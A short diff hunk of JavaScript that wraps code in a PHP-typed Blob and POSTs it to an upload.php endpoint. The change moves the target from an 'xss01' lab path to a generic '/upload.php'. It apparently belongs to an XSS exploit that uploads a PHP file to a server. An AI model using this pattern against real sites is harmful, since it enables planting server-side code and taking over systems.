@@ -16,7 +16,7 @@
         new Blob([code], { type: 'application/x-php' }),
         filename
       );
-      return fetch('/xss01/upload.php', {
+      return fetch('/upload.php', {
         method: 'POST',
         body: form
       });
